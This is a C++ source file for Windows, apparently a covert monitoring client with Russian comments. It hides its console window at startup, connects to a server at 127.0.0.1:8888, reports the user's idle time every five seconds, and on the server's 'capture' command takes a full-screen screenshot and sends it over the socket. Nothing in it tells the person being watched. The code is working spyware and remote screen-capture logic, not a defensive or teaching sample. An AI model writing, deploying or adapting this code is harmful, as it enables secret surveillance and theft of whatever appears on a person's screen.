#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <windows.h>
#include <gdiplus.h>
#include <fstream>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

#define SERVER_IP "127.0.0.1"
#define DEFAULT_PORT "8888"

using namespace Gdiplus;


int getIdleTime() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&lii);

    DWORD idleTime = (GetTickCount() - lii.dwTime) / 1000; // в секундах
    return static_cast<int>(idleTime);
}


int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::ImageCodecInfo* pCodecInfo = nullptr;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, pCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pCodecInfo[j].Clsid;
            free(pCodecInfo);
            return j;
        }
    }
    free(pCodecInfo);
    return -1;
}


void captureScreen(SOCKET connectSocket) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    CLSID clsid;
    if (GetEncoderClsid(L"image/png", &clsid) == -1) {
        std::cerr << "Failed to get encoder CLSID." << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        GdiplusShutdown(gdiplusToken);
        return;
    }

    Gdiplus::Bitmap bmp(hBitmap, NULL);


    const wchar_t* screenshotFilePath = L"screenshot.png"; // Изменено имя файла
    bmp.Save(screenshotFilePath, &clsid, NULL);

    
    std::ifstream file(screenshotFilePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open temporary screenshot file." << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        GdiplusShutdown(gdiplusToken);
        return;
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    
    int fileSize = buffer.size();
    if (send(connectSocket, (const char*)&fileSize, sizeof(int), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send file size." << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        GdiplusShutdown(gdiplusToken);
        return;
    }

    
    if (send(connectSocket, buffer.data(), fileSize, 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send screenshot." << std::endl;
    } else {
        std::cout << "Screenshot sent to server." << std::endl;
    }

}


void sendIdleTime(SOCKET connectSocket) {
    while (true) {
        Sleep(5000); // Проверяем каждые 5 секунд
        int idleTime = getIdleTime();

        std::string message = "idle_time:" + std::to_string(idleTime);
        if (send(connectSocket, message.c_str(), (int)message.length(), 0) == SOCKET_ERROR) {
            std::cerr << "Failed to send idle time." << std::endl;
            break;
        }
        std::cout << "Idle time sent to server: " << idleTime << " seconds." << std::endl;
    }
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    // std::ofstream nullStream("nul");
    // std::cout.rdbuf(nullStream.rdbuf());

    WSADATA wsaData;
    SOCKET connectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    int iResult;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(SERVER_IP, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (connectSocket == INVALID_SOCKET) {
            std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
            WSACleanup();
            return 1;
        }

        iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(connectSocket);
            connectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (connectSocket == INVALID_SOCKET) {
        std::cerr << "Unable to connect to server!" << std::endl;
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to server!" << std::endl;

    std::thread idleThread(sendIdleTime, connectSocket);
    idleThread.detach();

    char recvbuf[512];
    int recvbuflen = 512;
    while (true) {
        int result = recv(connectSocket, recvbuf, recvbuflen, 0);
        if (result > 0) {
            recvbuf[result] = '\0';
            std::cout << "Received command: " << recvbuf << std::endl;

            if (strcmp(recvbuf, "capture") == 0) {
                captureScreen(connectSocket);
            } else if (strcmp(recvbuf, "exit") == 0) {
                std::cout << "Server requested to close connection." << std::endl;
                break;
            }
        } else if (result == 0) {
            std::cout << "Connection closed." << std::endl;
            break;
        } else {
            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            break;
        }
    }

    closesocket(connectSocket);
    WSACleanup();

    return 0;
}
